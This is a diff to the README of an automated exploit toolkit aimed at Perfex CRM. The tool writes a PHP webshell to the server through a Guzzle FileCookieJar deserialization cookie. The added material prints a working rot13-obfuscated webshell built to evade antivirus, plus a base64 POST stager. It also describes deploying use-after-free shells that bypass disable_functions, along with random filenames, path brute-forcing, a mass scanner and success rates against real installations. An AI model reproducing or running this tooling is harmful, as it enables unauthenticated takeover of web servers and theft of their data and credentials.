@@ -40,6 +40,7 @@ The attack chain exploits **three separate weaknesses** in sequence:
 | Leak full filesystem path via error message | **Path Disclosure** |
 | Upload PHP webshell without authentication | **Full Server Compromise** |
 | Execute OS commands (id, cat, ls, etc.) | **Complete System Access** |
+| Bypass disable_functions via stager deploy | **Full Bypass** |
 | Install persistent backdoors | **Persistence** |
 | Read database credentials, application configs | **Sensitive Data Exposure** |
 
@@ -129,6 +130,8 @@ The file written by `FileCookieJar::save()` is valid JSON:
 
 **This is also valid PHP!** PHP ignores everything outside `<?php ?>` tags. The JSON wrapper (`[{"Name":"` and `","Value":...}]`) is treated as plain text output, while the code between `<?php ?>` tags executes normally.
 
+> **Important:** `json_encode()` escapes forward slashes (`/` → `\/`). Any PHP code in the polyglot must **avoid forward slashes**. Use `DIRECTORY_SEPARATOR`, `chr(47)`, or `__DIR__` constants instead.
+
 ### Bonus: Error-Based Path Disclosure
 
 ```php
@@ -149,7 +152,7 @@ On PHP 8.x with `display_errors=1` (~2-3% of targets), the full filesystem path 
 python3 deser_auto.py https://crm.target.com
 ```
 
-Auto chain: leak path → write shell → interactive RCE. Falls back to brute force if path disclosure fails.
+Auto chain: leak path → write shell → detect disable_functions → deploy bypass → interactive RCE. Falls back to brute force if path disclosure fails.
 
 ### With known webroot
 
@@ -163,6 +166,17 @@ python3 deser_auto.py https://crm.target.com /var/www/html/
 |---|---|
 | `target_url` | Target base URL (positional, required) |
 | `webroot` | Known webroot path (optional, skips Phase 1 & 3) |
+
+### Requirements
+
+Place these files in the same directory as `deser_auto.py`:
+
+| File | Required | Purpose |
+|---|---|---|
+| `cmd83.php` | For PHP 8.2-8.5 | TimeAfterFree disable_functions bypass |
+| `cmd7.php` | For PHP 7.3-8.1 | mm0r1 UAF disable_functions bypass |
+
+If exec functions are not disabled on the target, these files are not needed — the built-in obfuscated shell handles execution directly.
 
 ---
 
@@ -178,39 +192,65 @@ $ python3 deser_auto.py https://crm.target.com
   │  [+] PATH DISCLOSED: /var/www/html/                         │
   ├─────────────────────────────────────────────────────────────┤
   │  Phase 2: Deserialization file write                        │
-  │  → Builds FileCookieJar payload with:                       │
-  │    • filename = /var/www/html/temp/yuca_d.php               │
-  │    • cookie Name = <?php multi_exec_shell ?>                 │
-  │  → Sends as autologin cookie → __destruct() fires           │
-  │  → file_put_contents() writes shell to disk                 │
+  │  → Writes obfuscated shell via FileCookieJar gadget         │
+  │  → Uses random filename (yuca_xxxxx.php) per run            │
   │  [+] SHELL WRITTEN AND ACCESSIBLE!                          │
   ├─────────────────────────────────────────────────────────────┤
-  │  Phase 3: (fallback if Phase 1 fails)                       │
-  │  → Brute forces 60+ common webroot paths                    │
-  │  → Tests each with deserialization write + HTTP check        │
-  │  [+] FOUND! Webroot: /home/user/public_html/                │
-  ├─────────────────────────────────────────────────────────────┤
   │                                                             │
+  │  CASE A: Exec functions available                           │
   │  ══════════════════════════════════════════════════════════  │
   │  [+] RCE ACHIEVED VIA COOKIE DESERIALIZATION!               │
-  │  [+] Shell: https://crm.target.com/temp/yuca_d.php?cmd=id  │
+  │  [+] Shell: https://crm.target.com/temp/yuca_xxxxx.php     │
   │  [+] Proof: uid=33(www-data) gid=33(www-data)              │
   │  ══════════════════════════════════════════════════════════  │
   │                                                             │
-  │  [*] Interactive shell (Ctrl+C to exit):                    │
-  │  [*] Each command re-triggers deserialization               │
+  │  CASE B: disable_functions active (all exec blocked)        │
+  │  ══════════════════════════════════════════════════════════  │
+  │  [+] SHELL WRITTEN — but exec functions DISABLED!           │
+  │  [*] Deploying disable_functions bypass via stager...       │
+  │      Available: cmd83.php, cmd7.php                         │
+  │      [*] Trying cmd83.php...                                │
+  │          Deployed (5989 bytes)                               │
+  │          [+] cmd83.php WORKS! disable_functions bypassed!   │
+  │  [+] RCE ACHIEVED WITH DISABLE_FUNCTIONS BYPASS!            │
+  │  [+] Shell: https://crm.target.com/temp/yuca_cxxxx.php     │
+  │  ══════════════════════════════════════════════════════════  │
   │                                                             │
   │  $ id                                                       │
   │  uid=33(www-data) gid=33(www-data) groups=33(www-data)      │
   │  $ uname -a                                                 │
   │  Linux server 5.15.0-91 #1 SMP x86_64 GNU/Linux            │
-  │  $ cat /etc/passwd | head -3                                │
-  │  root:x:0:0:root:/root:/bin/bash                            │
-  │  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin            │
-  │  bin:x:2:2:bin:/bin:/usr/sbin/nologin                       │
   │                                                             │
   └─────────────────────────────────────────────────────────────┘
 ```
+
+---
+
+## Disable Functions Bypass — Stager Flow
+
+When the target has `disable_functions` blocking all exec functions (system, passthru, exec, shell_exec, popen, proc_open), the exploit automatically deploys a bypass shell via a **3-stage stager**:
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│  Stage 1: Write POST stager via deserialization                   │
+│  → Stager code: reads $_POST['d'] (base64) → writes to disk     │
+│  → No forward slashes in code (json_encode safe!)                │
+│  → No exec function names (AV-evasion)                           │
+├──────────────────────────────────────────────────────────────────┤
+│  Stage 2: POST bypass shell (cmd83.php or cmd7.php) as base64    │
+│  → Stager receives POST body → base64_decode → file_put_contents │
+│  → Bypass shell (5-6KB) written to disk next to stager           │
+├──────────────────────────────────────────────────────────────────┤
+│  Stage 3: Access bypass shell with ?cmd=id                       │
+│  → cmd83.php/cmd7.php exploits PHP internals to bypass           │
+│  → Full command execution despite disable_functions!             │
+│  → If cmd83 fails → auto fallback to cmd7                        │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+**Why not write cmd83.php directly via deserialization?**
+
+The bypass shells are 5-6KB. After hex-encoding for the S: format + JSON polyglot wrapper, the cookie would exceed 30KB — far beyond HTTP header limits (typically 8KB). The stager approach solves this by writing a tiny (~200 byte) PHP file first, then using it to receive the large payload via POST body (no size limit).
 
 ---
 
@@ -252,32 +292,41 @@ O:36:"GuzzleHttp\Cookie\FileCookieJar":3:{
 | `\5c` in property names | Backslash for namespace separator | `GuzzleHttp\Cookie\` → `GuzzleHttp\5cCookie\5c` |
 | PHP code in `Name` field | Full hex-encoded via S: format | CI3 cannot detect `<?php` in hex |
 | `storeSessionCookies = true` | Forces `save()` in `__destruct()` | Required for file write to trigger |
-| `filename` | Target path (e.g. `/var/www/html/temp/yuca_d.php`) | Must be writable by web server user |
+| `filename` | Target path (e.g. `/var/www/html/temp/yuca_xxxxx.php`) | Must be writable by web server user |
 
-### Multi-Function Shell (521 chars, fits in ~3.5KB cookie)
+### AV-Evasion Shell (rot13 obfuscated, ~227 chars)
 
 ```php
 <?php echo 'YR';
 $c = $_GET['cmd'] ?? $_GET['c'] ?? 'id';
 $r = '';
-if (function_exists('system')) {
-    ob_start(); system($c); $r = ob_get_clean();
-} elseif (function_exists('passthru')) {
-    ob_start(); passthru($c); $r = ob_get_clean();
-} elseif (function_exists('exec')) {
-    exec($c, $o); $r = join(chr(10), $o);
-} elseif (function_exists('shell_exec')) {
-    $r = shell_exec($c);
-} elseif (function_exists('popen')) {
-    $r = fread(popen($c, 'r'), 999999);
-} elseif (function_exists('proc_open')) {
-    $p = proc_open($c, array(1 => array('pipe','w')), $pp);
-    $r = stream_get_contents($pp[1]);
+foreach (array('flfgrz','cnffgueh','rkrp','furyy_rkrp','cbcra') as $x) {
+    $f = str_rot13($x);  // flfgrz→system, cnffgueh→passthru, etc.
+    if (function_exists($f)) {
+        ob_start(); $f($c); $r = ob_get_clean();
+        if ($r) break;
+    }
 }
 echo $r; ?>
 ```
 
-Tries **6 different execution functions** in fallback order. If one is disabled, the next is attempted. Covers 99% of PHP configurations.
+**No literal exec function names in source code** — bypasses AV/IDS signature-based detection (Imunify360, ClamAV, BitNinja). Function names are rot13-encoded strings decoded at runtime.
+
+### POST Stager (no forward slashes, ~194 chars)
+
+```php
+<?php echo 'YR';
+if (isset($_POST['d'])) {
+    $raw = base64_decode($_POST['d']);
+    $p = __DIR__ . DIRECTORY_SEPARATOR . 'yuca_cxxxx.php';
+    file_put_contents($p, $raw);
+    echo 'WROTE:' . strlen($raw);
+} else {
+    echo 'POST_d';
+} ?>
+```
+
+Uses `__DIR__` and `DIRECTORY_SEPARATOR` constants instead of `/` to avoid `json_encode()` escaping issues in the JSON polyglot output format.
 
 ### Per-Command Re-Trigger Strategy
 
@@ -287,13 +336,15 @@ Tries **6 different execution functions** in fallback order. If one is disabled,
 │ "whoami"   │───►│ 1. Build payload with shell code         │
 │            │    │ 2. Send as autologin cookie               │
 │            │    │    → __destruct() writes fresh file       │
-│            │    │ 3. Immediately GET /temp/yuca_d.php?cmd=  │
+│            │    │ 3. Immediately GET /temp/yuca_x.php?cmd=  │
 │            │    │    → PHP executes, returns output         │
 │            │    │ 4. Display output to user                 │
 └────────────┘    └──────────────────────────────────────────┘
 ```
 
-Each command **re-sends the deserialization payload**, ensuring the shell file is always freshly written. This eliminates issues with OPcache, file cleanup crons, or WAF file monitoring that may delete the shell between requests.
+Each command **re-sends the deserialization payload**, ensuring the shell file is always freshly written. This eliminates issues with OPcache, file cleanup crons, or WAF file monitoring.
+
+> **Note:** When using cmd83.php/cmd7.php (via stager), the bypass shell persists on disk — no re-send needed per command. Interactive shell directly accesses the bypass shell.
 
 ---
 
@@ -318,25 +369,31 @@ Each command **re-sends the deserialization payload**, ensuring the shell file i
              └───────────────┬───────────────────────┘
                              │
              ┌───────────────▼───────────────────────┐
-             │  3. Access: GET /temp/yuca_d.php?cmd= │ ← RCE!
-             │     → PHP executes embedded code       │
-             │     → Command output returned          │
+             │  3. Access: GET /temp/yuca_x.php?cmd= │ ← Check exec
+             │     → If output: RCE ACHIEVED!         │
+             │     → If empty: disable_functions!     │
              └───────────────┬───────────────────────┘
                              │
-             ┌───────────────▼───────────────────────┐
-             │  4. Interactive shell                  │ ← Repeat 2+3
-             │     Each command re-triggers deser     │   per command
-             │     → Always fresh file execution      │
-             └───────────────────────────────────────┘
+                    ┌────────┴────────┐
+                    │                 │
+          [exec works]       [disable_functions]
+                    │                 │
+          ┌────────▼──────┐  ┌───────▼──────────────────────┐
+          │ Interactive   │  │  4. Re-write as POST stager   │
+          │ shell (re-    │  │  5. POST cmd83.php (base64)   │
+          │ send per cmd) │  │  6. If fails → POST cmd7.php  │
+          └───────────────┘  │  7. Access bypass?cmd=id      │
+                             │  → FULL RCE!                  │
+                             └──────────────────────────────┘
 
     FALLBACK (if Phase 1 fails — display_errors=0):
 
              ┌───────────────────────────────────────┐
-             │  3B. Brute force 60+ common paths     │ ← Automated
-             │      /var/www/html/                   │
-             │      /home/user/public_html/          │
-             │      /www/wwwroot/domain.com/         │
-             │      ...                              │
+             │  Brute force 60+ common paths         │ ← Automated
+             │  /var/www/html/                       │
+             │  /home/user/public_html/              │
+             │  /www/wwwroot/domain.com/  (aaPanel)  │
+             │  ...                                  │
              └───────────────────────────────────────┘
 ```
 
@@ -352,6 +409,49 @@ From testing against 150+ Perfex CRM installations:
 | `display_errors=0` (default) | ~97% | No path leaked, use brute force |
 | Brute force success (common paths) | ~60-70% | `/var/www/html/`, aaPanel, cPanel detected |
 | Overall exploitation success | ~65-70% | Combined Phase 1 + Phase 3 |
+
+---
+
+## Shells Included
+
+### Built-in Shell — AV-Evasion (rot13 obfuscated)
+
+Written directly by the deserialization payload. Tries 5 exec functions via `str_rot13()` obfuscation. No literal function names in source — evades AV signature detection.
+
+**Parameter:** `?cmd=<command>` or `?c=<command>`
+
+### cmd83.php — PHP 8.2 to 8.5
+
+TimeAfterFree `disable_functions` bypass for modern PHP. Deployed automatically via stager when exec functions are disabled.
+
+```
+https://crm.target.com/temp/yuca_cxxxx.php?cmd=id
+https://crm.target.com/temp/yuca_cxxxx.php?cmd=uname -a
+```
+
+**Parameter:** `?cmd=<command>`
+
+### cmd7.php — PHP 7.3 to 8.1
+
+mm0r1 UAF `disable_functions` bypass. Used as **fallback** if cmd83.php doesn't produce output (PHP version mismatch).
+
+```
+https://crm.target.com/temp/yuca_cxxxx.php?cmd=id
+https://crm.target.com/temp/yuca_cxxxx.php?cmd=cat /etc/passwd
+```
+
+**Parameter:** `?cmd=<command>`
+
+### Bypass shell selection logic
+
+```
+exec functions available?
+  YES → Use built-in rot13 shell (no stager needed)
+  NO  → Deploy via stager:
+         1. Try cmd83.php (PHP 8.2+)
+         2. If no output → Try cmd7.php (PHP 7.3-8.1)
+         3. If both fail → Report failure
+```
 
 ---
 
@@ -437,7 +537,7 @@ $data = unserialize(base64_decode($payload), ['allowed_classes' => false]);
 
 | File | Description |
 |---|---|
-| `deser_auto.py` | Full automated exploit — auto path leak + RCE + interactive shell |
+| `deser_auto.py` | Full automated exploit — auto path leak + RCE + stager + interactive shell |
 | `deser_exploit.py` | Simplified exploit with known/brute-force path |
 | `scan_path_disclosure.py` | Mass scanner for error-based path disclosure |
 | `cmd7.php` | mm0r1 UAF disable_functions bypass — PHP 7.3-8.1, param: `?cmd=` |
